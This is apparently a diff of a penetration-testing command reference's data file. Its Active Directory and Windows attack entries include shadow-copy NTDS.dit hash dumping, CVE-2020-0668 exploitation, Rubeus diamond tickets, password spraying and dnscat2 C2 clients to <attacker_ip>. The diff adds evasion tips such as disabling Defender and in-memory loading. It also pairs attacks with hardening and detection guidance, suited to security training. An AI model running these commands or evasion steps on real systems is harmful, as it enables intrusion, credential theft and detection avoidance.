+          "label": "Run as the saved user (no password prompt)",
+          "command": "runas /savecred /user:<domain>\\<user> cmd"
+        }
+      ]
     },
     {
       "type": "command",
@@ -11976,8 +12849,25 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1552",
           "MITRE T1087.002"
-        ]
-      }
+        ],
+        "evasion": "Copy the credential store (browser Login Data, .kdbx, PSReadline history) and decrypt/crack it OFFLINE rather than running signatured binaries (LaZagne/SharpChrome) on the host; scope searches to likely paths to limit disk I/O; use built-in cmdlets over dropped tools."
+      },
+      "variations": [
+        {
+          "label": "Domain user descriptions (PowerView)",
+          "command": "Get-DomainUser -Properties samaccountname,description | ?{$_.description} | select samaccountname,description"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Check local user descriptions",
+          "command": "Get-LocalUser | select Name,Description"
+        },
+        {
+          "label": "Check domain user descriptions for passwords",
+          "command": "Get-DomainUser -Properties description | ?{$_.description -match 'pass|pw'}"
+        }
+      ]
     },
     {
       "id": "cdsa-m06-credentials-in-objects",
@@ -12130,7 +13020,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "IT staff store scripts, configuration files, or documents containing plaintext credentials on SMB shares that are readable by all domain users (SYSVOL, NETLOGON, or file server shares with 'Everyone: Read'). These credentials — often service account passwords, API keys, or admin passwords left in batch files — are accessible to any authenticated domain user.",
         "vulnerable_config": "# SMB share readable by all domain users:\n# \\\\fileserver\\IT\\scripts\\deploy.bat\n# Contents:\nnet use Z: \\\\server\\share /user:CORP\\svc_deploy P@ssw0rd123  # cleartext password\n\n# SYSVOL scripts with embedded credentials:\n# \\\\corp.local\\SYSVOL\\corp.local\\scripts\\logon.bat\nnet user administrator TempAdminPass2023! /domain  # domain admin password!\n\n# Config files:\n# \\\\server\\configs\\web.config: connectionString containing DB password",
-        "secure_config": "# 1. Audit shares for credentials:\n# PowerShell — search for password strings in SMB shares:\nGet-ChildItem '\\\\corp.local\\SYSVOL' -Recurse -Include '*.bat','*.ps1','*.xml','*.config' |\n    Select-String -Pattern 'password|passwd|pwd|credentials|secret' |\n    Select-Object Path, LineNumber, Line\n\n# 2. Replace hardcoded credentials with proper secrets management:\n# Use gMSA for service accounts (no stored password needed)\n# Use Windows Credential Manager / DPAPI for interactive scripts\n# Use a PAM solution (CyberArk, HashiCorp Vault) for privileged credentials\n\n# 3. Restrict share permissions:\n# Remove 'Everyone: Read' from administrative shares\n# Use security groups with need-to-know membership\n# Enable access-based enumeration (users only see shares they can access)\n\n# 4. Monitor with DLP or file activity monitoring:\n# Alert on access to files containing password keywords"
+        "secure_config": "# 1. Audit shares for credentials:\n# PowerShell — search for password strings in SMB shares:\nGet-ChildItem '\\\\corp.local\\SYSVOL' -Recurse -Include '*.bat','*.ps1','*.xml','*.config' |\n    Select-String -Pattern 'password|passwd|pwd|credentials|secret' |\n    Select-Object Path, LineNumber, Line\n\n# 2. Replace hardcoded credentials with proper secrets management:\n# Use gMSA for service accounts (no stored password needed)\n# Use Windows Credential Manager / DPAPI for interactive scripts\n# Use a PAM solution (CyberArk, HashiCorp Vault) for privileged credentials\n\n# 3. Restrict share permissions:\n# Remove 'Everyone: Read' from administrative shares\n# Use security groups with need-to-know membership\n# Enable access-based enumeration (users only see shares they can access)\n\n# 4. Monitor with DLP or file activity monitoring:\n# Alert on access to files containing password keywords",
+        "evasion": "Access the exposed secret directly and avoid re-triggering the exposure; pull the file over an existing channel."
       }
     },
     {
@@ -12196,7 +13087,7 @@ const COMMAND_DATA = {
         },
         {
           "title": "Reverse Shell Cheat Sheet",
-          "url": "http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
+          "url": "https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
         },
         {
           "title": "HTB Academy - Linux Privilege Escalation",
@@ -12372,37 +13263,37 @@ const COMMAND_DATA = {
         {
           "command": "crunch 6 6 -t Lab%%% -o lab-wordlist.txt",
           "caption": "PEN-200 style: 'Lab' + 3 digits (Lab000-Lab999)",
-          "label": "TXT output"
+          "label": "Pattern: Lab%%%"
         },
         {
           "command": "crunch 8 8 0123456789 -o digits8.txt",
           "caption": "All 8-digit numeric passwords",
-          "label": "TXT output"
+          "label": "8-digit numeric"
         },
         {
           "command": "crunch 6 6 abcdefghijklmnopqrstuvwxyz0123456789 -o alphanum6.txt",
           "caption": "6-char alphanumeric (lowercase + digits)",
-          "label": "TXT output"
+          "label": "6-char alphanumeric"
         },
         {
           "command": "crunch 10 10 -t Company%%%^ -o company-pass.txt",
           "caption": "Pattern: 'Company' + 3 digits + 1 symbol",
-          "label": "TXT output"
+          "label": "Pattern: Company%%%^"
         },
         {
           "command": "crunch 4 8 -f /usr/share/crunch/charset.lst mixalpha-numeric -o mixed.txt",
           "caption": "Use built-in charset file for mixed alphanumeric 4-8 chars",
-          "label": "TXT output"
+          "label": "charset.lst (mixalpha-num)"
         },
         {
           "command": "crunch 6 6 -t Lab%%% | hashcat -m 0 <hash_file> --stdin",
           "caption": "Pipe directly to hashcat (no disk write)",
-          "label": "crunch 6 6 -t"
+          "label": "Pipe -> hashcat"
         },
         {
           "command": "crunch 6 6 -t Lab%%% | hydra -l admin -P - ssh://<target>",
           "caption": "Pipe directly to hydra for online brute-force",
-          "label": "crunch 6 6 -t"
+          "label": "Pipe -> hydra (SSH)"
         }
       ],
       "examples": [
@@ -12691,7 +13582,7 @@ const COMMAND_DATA = {
       ],
       "id": "cve-2020-0668",
       "name": "CVE-2020-0668 - Service Tracing Symlink EoP",
-      "command": "CVE-2020-0668.exe <payload.exe> \"<protected_target_path>\"",
+      "command": "CVE-2020-0668.exe <payload_exe> \"<protected_target_path>\"",
       "description": "Windows service tracing lets a low-priv user create an arbitrary-file symlink, overwriting a SYSTEM-run binary. Generate a payload, use the exploit to plant it over a service binary (e.g. Mozilla Maintenance), then start that service.",
       "opsec": "loud",
       "mitre": [
@@ -12711,8 +13602,25 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M26",
           "MITRE T1068"
-        ]
-      }
+        ],
+        "evasion": "Run the PoC in-memory (reflective load) rather than dropping the EXE; disable/neuter Defender first if you already have admin; rename the binary to dodge static IOCs; kernel PoCs are unstable — test against a snapshot to avoid crashing the target."
+      },
+      "variations": [
+        {
+          "label": "Point at any SYSTEM-writable target path",
+          "command": "CVE-2020-0668.exe <payload_exe> \"C:\\Windows\\System32\\<dll_or_exe>\""
+        }
+      ],
+      "steps": [
+        {
+          "label": "Confirm the service/patch level is vulnerable",
+          "command": "systeminfo | findstr /B /C:\"OS Version\""
+        },
+        {
+          "label": "Run the arbitrary-file-move exploit",
+          "command": "CVE-2020-0668.exe <payload_exe> \"<protected_target_path>\""
+        }
+      ]
     },
     {
       "id": "cdsa-cyber-kill-chain",
@@ -12982,7 +13890,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "User or computer accounts have been granted AD replication rights (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All) that are not needed for their role. These rights are required by Domain Controllers to synchronize, but if granted to a regular account (via ACL on the domain object, or inherited through group membership), the account can call DRSGetNCChanges() and pull NTLM hashes for any account — including krbtgt and Domain Admins.",
         "vulnerable_config": "# Checking who has dangerous replication rights on the domain object:\n# (via BloodHound 'DCSync' edge, or directly):\nGet-ObjectAcl -DistinguishedName 'DC=corp,DC=local' -ResolveGUIDs |\n  Where-Object {$_.ActiveDirectoryRights -match 'DS-Replication-Get-Changes'} |\n  Select-Object IdentityReference, ActiveDirectoryRights\n\n# Dangerous output:\n# IdentityReference            ActiveDirectoryRights\n# CORP\\svc_monitoring          DS-Replication-Get-Changes-All\n# CORP\\john.doe                DS-Replication-Get-Changes\n\n# Legitimate holders: CORP\\Domain Controllers, CORP\\Enterprise Controllers, CORP\\ENTERPRISE DOMAIN CONTROLLERS",
-        "secure_config": "# Remove DCSync rights from non-DC accounts:\n# Using PowerView:\n$acl = Get-Acl 'AD:\\DC=corp,DC=local'\n$ace = $acl.Access | Where-Object {\n    $_.IdentityReference -match 'svc_monitoring' -and\n    $_.ObjectType -eq 'DS-Replication-Get-Changes-All'\n}\n$acl.RemoveAccessRule($ace)\nSet-Acl 'AD:\\DC=corp,DC=local' $acl\n\n# Alert on all DCSync-capable accounts:\n# Microsoft Defender for Identity detects DCSync automatically (alert: 'DCSync attack')\n# SIEM: Watch for 4662 events with replication rights GUIDs:\n# {19195a5b-6da0-11d0-afd3-00c04fd930c9} = DS-Replication-Get-Changes\n# {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} = DS-Replication-Get-Changes-All"
+        "secure_config": "# Remove DCSync rights from non-DC accounts:\n# Using PowerView:\n$acl = Get-Acl 'AD:\\DC=corp,DC=local'\n$ace = $acl.Access | Where-Object {\n    $_.IdentityReference -match 'svc_monitoring' -and\n    $_.ObjectType -eq 'DS-Replication-Get-Changes-All'\n}\n$acl.RemoveAccessRule($ace)\nSet-Acl 'AD:\\DC=corp,DC=local' $acl\n\n# Alert on all DCSync-capable accounts:\n# Microsoft Defender for Identity detects DCSync automatically (alert: 'DCSync attack')\n# SIEM: Watch for 4662 events with replication rights GUIDs:\n# {19195a5b-6da0-11d0-afd3-00c04fd930c9} = DS-Replication-Get-Changes\n# {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} = DS-Replication-Get-Changes-All",
+        "evasion": "Run the escalation in-memory where possible, restore any modified config/ACL, and remove dropped payloads after obtaining the higher context."
       }
     },
     {
@@ -13152,7 +14061,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Searches an offline database of vendor default credentials (creds/cli) for a product, to try known factory logins.",
+        "why_it_works": "Vendors ship products with well-known default credentials that admins often never change; this looks up those defaults by product name.",
         "prerequisites": "The product/vendor name and the default-creds dataset.",
         "impact": "Candidate default logins to try - an offline lookup.",
         "prevention": "[MITRE T1078.001 M1027] Change all vendor default credentials at deployment and audit for them.",
@@ -13162,7 +14071,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Password policies are insufficiently strict: minimum length too short (< 12 chars), no complexity requirement, no history check (allows password reuse), no lockout or too-lenient lockout threshold. Combined with credential reuse across services, a single cracked hash grants access to multiple systems.",
         "vulnerable_config": "# Weak domain password policy:\nGet-ADDefaultDomainPasswordPolicy\n# MinPasswordLength:    8    <-- too short\n# PasswordHistoryCount: 0    <-- no history, password reuse allowed\n# ComplexityEnabled:    False <-- no complexity\n# LockoutThreshold:     0    <-- NO lockout\n\n# Local SAM policy (workgroup machines):\n# Control Panel -> Local Security Policy -> Account Policies -> Password Policy\n# Same weak defaults as above",
-        "secure_config": "# Set a strong domain password policy:\nSet-ADDefaultDomainPasswordPolicy -Identity corp.local \\\n    -MinPasswordLength 14 \\\n    -PasswordHistoryCount 24 \\\n    -ComplexityEnabled $true \\\n    -MaxPasswordAge 90.00:00:00 \\\n    -LockoutThreshold 5 \\\n    -LockoutDuration 00:30:00 \\\n    -LockoutObservationWindow 00:30:00\n\n# Fine-Grained PSO for privileged accounts (stricter):\nNew-ADFineGrainedPasswordPolicy -Name PrivilegedPSO \\\n    -MinPasswordLength 20 -PasswordHistoryCount 48 \\\n    -ComplexityEnabled $true -LockoutThreshold 3 \\\n    -LockoutDuration 01:00:00 -Precedence 1\nAdd-ADFineGrainedPasswordPolicySubject PrivilegedPSO -Subjects 'Domain Admins'\n\n# Deploy Azure AD Password Protection (blocks common passwords on-prem too)\n# Enable Microsoft Entra ID Smart Lockout"
+        "secure_config": "# Set a strong domain password policy:\nSet-ADDefaultDomainPasswordPolicy -Identity corp.local \\\n    -MinPasswordLength 14 \\\n    -PasswordHistoryCount 24 \\\n    -ComplexityEnabled $true \\\n    -MaxPasswordAge 90.00:00:00 \\\n    -LockoutThreshold 5 \\\n    -LockoutDuration 00:30:00 \\\n    -LockoutObservationWindow 00:30:00\n\n# Fine-Grained PSO for privileged accounts (stricter):\nNew-ADFineGrainedPasswordPolicy -Name PrivilegedPSO \\\n    -MinPasswordLength 20 -PasswordHistoryCount 48 \\\n    -ComplexityEnabled $true -LockoutThreshold 3 \\\n    -LockoutDuration 01:00:00 -Precedence 1\nAdd-ADFineGrainedPasswordPolicySubject PrivilegedPSO -Subjects 'Domain Admins'\n\n# Deploy Azure AD Password Protection (blocks common passwords on-prem too)\n# Enable Microsoft Entra ID Smart Lockout",
+        "evasion": "Low-and-slow, respect lockout thresholds, spray one credential widely rather than many against one account, and prefer protocols without logging where valid."
       },
       "type": "command"
     },
@@ -13574,6 +14484,11 @@ const COMMAND_DATA = {
           "id": "crtp-silver-ticket",
           "note": "Service-specific persistence",
           "rel": "alternative"
+        },
+        {
+          "id": "crtp-child-to-parent",
+          "rel": "next",
+          "note": "Use the elevated TGT (SID history / extra SIDs) to escalate from child to parent domain"
         }
       ],
       "notes": "Uses /tgtdeleg to get a real delegated TGT, then modifies the PAC. The DC's server signature is real — evades standard golden ticket detection.",
@@ -13597,7 +14512,13 @@ const COMMAND_DATA = {
         "misconfiguration": "krbtgt password never rotated. PAC validation not enforced. MDI not deployed or not updated. No SIEM correlation of PAC group membership anomalies.",
         "vulnerable_config": "# krbtgt hash available (from DCSync or NTDS.dit):\n# Attacker has: krbtgt NTLM hash 31d6cfe0d16ae931b73c59d7e0c089c0\n# + valid TGT for user 'helpdesk1' (low-priv)\n# → Rubeus /diamond /tgtdeleg modifies PAC → DA-equivalent access\n# Unlike Golden Ticket, AS-REQ log entry EXISTS → detection harder",
         "secure_config": "# Same mitigation as Golden Ticket — requires krbtgt hash:\n# Double-rotate krbtgt (Microsoft script):\n.\\New-KrbtgtKeys.ps1 -Mode EnableAES\n# Wait 10+ hours, repeat\n\n# PAC validation:\nSet-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name ValidateKdcPacSignature -Value 1\n\n# Enforce Authentication Policy Silos for DA accounts:\n# Even with DA PAC, restrict which computers DAs can authenticate from\nNew-ADAuthenticationPolicy -Name 'DA-Policy' -UserAllowedToAuthenticateFrom 'PAW-Computers-SG'"
-      }
+      },
+      "variations": [
+        {
+          "label": "AES key",
+          "command": "Rubeus.exe diamond /tgtdeleg /ticketuser:<user> /ticketuserid:<rid> /groups:512 /krbkey:<krbtgt_aes> /nowrap"
+        }
+      ]
     },
     {
       "id": "directory-traversal",
@@ -13686,7 +14607,8 @@ const COMMAND_DATA = {
         "why_it_works": "../ sequences in a path instruct the OS to move to the parent directory. By chaining enough ../ sequences, any file on the filesystem is reachable from any starting directory. The OS resolves the path before the application can validate it. If the application prepends a base path (./languages/), the traversal must account for that depth but still succeeds.",
         "impact": "Same as basic LFI — arbitrary file read. Path traversal is the primary technique for bypassing base-directory restrictions when absolute paths are blocked.",
         "detection": "[MITRE T1083] WAF: ../ patterns in parameters. Encoded variants: %2e%2e%2f, ..%2f, %252e%252e%252f. IDS signature: multiple repeated ../ sequences in a single parameter value.",
-        "artifacts": "Access log: parameter values with ../../../../ sequences. WAF log: traversal pattern blocked or flagged."
+        "artifacts": "Access log: parameter values with ../../../../ sequences. WAF log: traversal pattern blocked or flagged.",
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
       }
     },
     {
@@ -13791,7 +14713,8 @@ const COMMAND_DATA = {
           "HTB M25",
           "MITRE T1068",
           "OWASP A06:2021"
-        ]
+        ],
+        "evasion": "Compile off-target and transfer only the final ELF; run once and clean it up; many public PoCs are unstable — verify the kernel/arch match before firing to avoid a panic."
       }
     },
     {
@@ -13872,11 +14795,6 @@ const COMMAND_DATA = {
         "secure_config": "# Enable Defender Tamper Protection (prevents disabling via registry/PowerShell):\n# Windows Security app -> Virus & threat protection -> Tamper Protection = On\n# Or via MEM/Intune policy\n\n# Monitor for Defender disablement:\n# Event 5001: Antivirus real-time protection disabled\n# Event 5007: Config change in AV\n# Alert immediately on any of these\n\n# Remove netcat from production Linux systems:\napt purge netcat-traditional netcat-openbsd ncat\n# Use firewall egress rules to block arbitrary outbound connections"
       },
       "variations": [
-        {
-          "description": "Disable Windows Defender real-time monitoring (requires admin)",
-          "command": "Set-MpPreference -DisableRealtimeMonitoring $true",
-          "label": "Disable RT monitoring"
-        },
         {
           "description": "Disable all Defender protections in one command",
           "command": "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true",
@@ -14106,7 +15024,7 @@ const COMMAND_DATA = {
       "source": "CPTS Module 10: Password Attacks",
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "dislocker mounts/unlocks a BitLocker volume once the recovery key or cracked password is known, exposing its files.",
+        "why_it_works": "BitLocker volumes are decryptable given the recovery key/password or a cleartext FVEK; dislocker uses that key material to mount the volume and read its files.",
         "prerequisites": "The BitLocker volume and a valid recovery key/password.",
         "impact": "Read access to the previously-encrypted volume's contents.",
         "prevention": "Protect BitLocker recovery keys (escrow in AD/Azure with restricted access); a strong passphrase keeps the volume closed if the key is unknown.",
@@ -14217,7 +15135,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1574.001",
           "MITRE T1574.002"
-        ]
+        ],
+        "evasion": "Place the hijack DLL, trigger the load, then remove it and restore the directory to reduce the on-disk window."
       }
     },
     {
@@ -14495,10 +15414,6 @@ const COMMAND_DATA = {
           "command": "dig any <domain> @<ip>"
         },
         {
-          "label": "AXFR zone transfer",
-          "command": "dig axfr <domain> @<ip>"
-        },
-        {
           "label": "AXFR internal zone",
           "command": "dig axfr internal.<domain> @<ip>"
         }
@@ -14595,23 +15510,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "A / AAAA",
-          "command": "dig domain.com A\ndig domain.com AAAA"
+          "command": "dig <domain> A\ndig <domain> AAAA"
         },
         {
           "label": "MX / NS / SOA",
-          "command": "dig domain.com MX\ndig domain.com NS\ndig domain.com SOA"
+          "command": "dig <domain> MX\ndig <domain> NS\ndig <domain> SOA"
         },
         {
           "label": "TXT / CNAME / ANY",
-          "command": "dig domain.com TXT\ndig domain.com CNAME\ndig domain.com ANY"
+          "command": "dig <domain> TXT\ndig <domain> CNAME\ndig <domain> ANY"
         },
         {
           "label": "Use a specific resolver",
-          "command": "dig @1.1.1.1 domain.com"
+          "command": "dig @<resolver> <domain>"
         },
         {
           "label": "Trace delegation",
-          "command": "dig +trace domain.com"
+          "command": "dig +trace <domain>"
         },
         {
           "label": "Reverse lookup",
@@ -14619,7 +15534,7 @@ const COMMAND_DATA = {
         },
         {
           "label": "Concise output",
-          "command": "dig +short domain.com\ndig +noall +answer domain.com"
+          "command": "dig +short <domain>\ndig +noall +answer <domain>"
         }
       ],
       "opsec": "moderate",
@@ -14688,10 +15603,6 @@ const COMMAND_DATA = {
         }
       ],
       "variations": [
-        {
-          "label": "Standard enum",
-          "command": "dnsrecon -d <domain> -t std"
-        },
         {
           "label": "Subdomain brute force with wordlist",
           "command": "dnsrecon -d <domain> -D <wordlist> -t brt"
@@ -14766,7 +15677,8 @@ const COMMAND_DATA = {
         "prevention": "Restrict zone transfers (AXFR) to authorized secondary DNS servers only. Remove internal-only records from public-facing DNS. Enable DNS query logging and alert on AXFR attempts from unapproved sources.",
         "sources": [
           "MITRE T1590.002"
-        ]
+        ],
+        "evasion": "Use passive sources first (cert transparency, public records); rate-limit active zone-transfer/brute attempts; a single AXFR attempt is quiet, brute-forcing is not."
       }
     },
     {
@@ -14843,7 +15755,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "DNS zones are publicly resolvable with no attempt to limit subdomain enumeration. Certificate Transparency logs expose internal subdomains. DNS wildcards (*) return valid responses, making bruteforce trivial. Internal-only subdomains resolving to RFC1918 addresses indicate split-horizon failures.",
         "vulnerable_config": "# Public Certificate Transparency logs expose internal hostnames:\n# crt.sh: *.corp.example.com -> dev.corp.example.com, staging.corp.example.com\n# Both resolve publicly and serve unprotected internal apps\n\n# DNS wildcard enabling bruteforce confirmation:\n# dig random-notexist.example.com  -> A record returned (wildcard)\n# Wildcard = must baseline filter during subdomain bruteforce",
-        "secure_config": "# Use private CAs for internal certificates (don't log to CT)\n# Or: use cert.pem with SAN list limited to public subdomains only\n\n# Split DNS: internal names only resolve from internal DNS servers\n# External DNS zone: only public hostnames\n# Internal DNS zone: all hostnames (served only to internal clients)\n\n# Remove wildcard DNS records unless required\n# Restrict zone transfer to secondary servers only\n# Use subresource integrity + HTTPS for all public-facing apps"
+        "secure_config": "# Use private CAs for internal certificates (don't log to CT)\n# Or: use cert.pem with SAN list limited to public subdomains only\n\n# Split DNS: internal names only resolve from internal DNS servers\n# External DNS zone: only public hostnames\n# Internal DNS zone: all hostnames (served only to internal clients)\n\n# Remove wildcard DNS records unless required\n# Restrict zone transfer to secondary servers only\n# Use subresource integrity + HTTPS for all public-facing apps",
+        "evasion": "Use passive sources first (cert transparency, public records); rate-limit active zone-transfer/brute attempts; a single AXFR attempt is quiet, brute-forcing is not."
       },
       "type": "command"
     },
@@ -15071,10 +15984,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "A record (default)",
-          "command": "nslookup <domain>"
-        },
-        {
           "label": "TXT record",
           "command": "nslookup -type=TXT <domain>"
         },
@@ -15233,17 +16142,17 @@ const COMMAND_DATA = {
         {
           "description": "Zone transfer with specific nameserver (AXFR via dig)",
           "command": "dig axfr @<nameserver_ip> <domain>",
-          "label": "AXFR zone transfer"
+          "label": "AXFR - by NS IP"
         },
         {
           "description": "Find authoritative nameserver first, then attempt transfer",
           "command": "dig ns <domain>\ndig axfr @<ns_hostname> <domain>",
-          "label": "AXFR zone transfer"
+          "label": "Find NS then AXFR"
         },
         {
           "description": "Test well-known vulnerable demo zone (zonetransfer.me)",
           "command": "dig axfr @nsztm1.digi.ninja zonetransfer.me",
-          "label": "AXFR zone transfer"
+          "label": "AXFR - zonetransfer.me demo"
         },
         {
           "description": "Zone transfer using host command",
@@ -15396,7 +16305,7 @@ const COMMAND_DATA = {
       "references": [
         {
           "title": "Abusing DnsAdmins (labofapenetrationtester)",
-          "url": "http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html"
+          "url": "https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html"
         },
         {
           "title": "HTB Academy - Windows Privilege Escalation",
@@ -15483,7 +16392,7 @@ const COMMAND_DATA = {
       "references": [
         {
           "title": "Abusing DnsAdmins (labofapenetrationtester)",
-          "url": "http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html"
+          "url": "https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html"
         },
         {
           "title": "HTB Academy - Windows Privilege Escalation",
@@ -15529,7 +16438,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1557.001",
           "MITRE T1040"
-        ]
+        ],
+        "evasion": "Use passive sources first (cert transparency, public records); rate-limit active zone-transfer/brute attempts; a single AXFR attempt is quiet, brute-forcing is not."
       }
     },
     {
@@ -15634,12 +16544,12 @@ const COMMAND_DATA = {
         {
           "command": "./dnscat --secret=<secret> <domain>",
           "caption": "Linux dnscat2 client: connect to server by domain",
-          "label": "dnscat"
+          "label": "dnscat client - via domain (NS)"
         },
         {
           "command": "./dnscat --dns server=<attacker_ip>,port=53 --secret=<secret>",
           "caption": "Linux dnscat2 client: connect directly to server IP",
-          "label": "dnscat"
+          "label": "dnscat client - direct to server"
         },
         {
           "command": "Import-Module .\\dnscat2.ps1\nStart-Dnscat2 -DNSserver <attacker_ip> -Domain <domain> -PreSharedSecret <secret> -Exec cmd",
@@ -15695,22 +16605,17 @@ const COMMAND_DATA = {
       "id": "dnsenum-full",
       "name": "DNSenum - Full DNS Enumeration",
       "description": "Automated DNS enumeration: NS/MX/SOA discovery, AXFR zone-transfer attempts against all nameservers, and subdomain brute force — all in a single command.",
-      "command": "dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o <output.xml> -f <wordlist> <domain>",
+      "command": "dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o <outfile> -f <wordlist> <domain>",
       "variations": [
-        {
-          "description": "Full enumeration with subdomain brute force via specific DNS server",
-          "command": "dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o <output.xml> -f <wordlist> <domain>",
-          "label": "XML output"
-        },
         {
           "description": "Quick enumeration with no brute force (NS/MX/AXFR only)",
           "command": "dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 <domain>",
-          "label": "dnsenum --dnsserver --enum -p"
+          "label": "dnsenum - full enum"
         },
         {
           "description": "Use SecLists subdomains wordlist for brute force",
           "command": "dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt <domain>",
-          "label": "dnsenum --dnsserver --enum -p"
+          "label": "dnsenum - with subdomain wordlist"
         },
         {
           "description": "Save results to XML for review",
@@ -15983,7 +16888,13 @@ const COMMAND_DATA = {
         "misconfiguration": "LockoutThreshold = 0 (no lockout) — unlimited spray attempts possible. Minimum password length 8. No Fine-Grained Policy for admins. No MFA.",
         "vulnerable_config": "# Check domain password policy:\nGet-ADDefaultDomainPasswordPolicy\n# LockoutThreshold : 0  ← CRITICAL — unlimited attempts\n# MinPasswordLength : 8  ← too short\n# ComplexityEnabled : True  ← satisfied by P@ssw0rd",
         "secure_config": "# Set strong domain password policy:\nSet-ADDefaultDomainPasswordPolicy -Identity corp.local `\n  -MinPasswordLength 14 `\n  -LockoutThreshold 5 `\n  -LockoutObservationWindow (New-TimeSpan -Minutes 30) `\n  -LockoutDuration (New-TimeSpan -Minutes 30) `\n  -ComplexityEnabled $true\n\n# Fine-Grained PSO for Domain Admins:\nNew-ADFineGrainedPasswordPolicy -Name 'PSO-DA' -Precedence 1 -MinPasswordLength 20 -LockoutThreshold 3 -LockoutObservationWindow (New-TimeSpan -Minutes 60) -LockoutDuration (New-TimeSpan -Minutes 0)\nAdd-ADFineGrainedPasswordPolicySubject 'PSO-DA' -Subjects 'Domain Admins'"
-      }
+      },
+      "variations": [
+        {
+          "label": "PowerView domain/password policy",
+          "command": "Get-DomainPolicyData | select -ExpandProperty SystemAccess"
+        }
+      ]
     },
     {
       "id": "crtp-password-spray",
@@ -16187,7 +17098,31 @@ const COMMAND_DATA = {
         "misconfiguration": "Too many accounts with DA rights — VSS access feasible for many attackers. No EDR on DCs. No alert on ntds.dit file access. VSS creation events not monitored outside backup windows.",
         "vulnerable_config": "# VSS created on DC without monitoring:\nvssadmin create shadow /for=C:\\\n# → shadow copy created → ntds.dit accessible at:\n# \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit\n# copy 'C:\\Windows\\system32\\config\\SYSTEM' C:\\temp\\SYSTEM\n# Then offline: secretsdump -ntds ntds.dit -system SYSTEM LOCAL",
         "secure_config": "# EDR rule: alert on ntds.dit access from non-NTDS service processes\n# Defender for Endpoint: 'NTDS.dit read by non-AD process' built-in alert\n\n# Monitor VSS events outside backup schedule:\n# SIEM: EventID=7036 AND ServiceName='Volume Shadow Copy' AND TimeOfDay NOT IN (backup_window) → ALERT\n\n# Restrict DC logon to DA accounts only:\n# Computer Config → Windows Settings → Security Settings → Local Policies → User Rights Assignment\n# → Allow log on locally: Administrators (only explicit DA, not broad group)\n\n# MDI on all DCs: detects ntds.dit extraction patterns"
-      }
+      },
+      "variations": [
+        {
+          "label": "diskshadow scripted",
+          "command": "diskshadow /s <script_file>   # create shadow, then copy ntds.dit"
+        },
+        {
+          "label": "Parse offline",
+          "command": "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Create a shadow copy of C:",
+          "command": "vshadow.exe -nw -p C:"
+        },
+        {
+          "label": "Copy NTDS.dit + SYSTEM hive off it",
+          "command": "robocopy /b \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyN\\Windows\\NTDS . ntds.dit ; reg save HKLM\\SYSTEM SYSTEM"
+        },
+        {
+          "label": "Extract all domain hashes offline",
+          "command": "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
+        }
+      ]
     },
     {
       "id": "ad-domainpasswordspray",
@@ -16286,12 +17221,12 @@ const COMMAND_DATA = {
         {
           "description": "Spray-Passwords.ps1 — OSCP-style PS spray against domain (includes admin accounts)",
           "command": ".\\Spray-Passwords.ps1 -Pass <password> -Admin",
-          "label": ".\\Spray-Passwords.ps1"
+          "label": "Spray incl. admin accounts"
         },
         {
           "description": "Spray-Passwords.ps1 — spray with user list, skip admin accounts",
-          "command": ".\\Spray-Passwords.ps1 -Pass <password> -UserList <userlist.txt>",
-          "label": ".\\Spray-Passwords.ps1"
+          "command": ".\\Spray-Passwords.ps1 -Pass <password> -UserList <userlist>",
+          "label": "Spray a user list"
         }
       ],
       "tools": [
@@ -16409,7 +17344,8 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "MITRE T1505.003",
           "MITRE T1059"
-        ]
+        ],
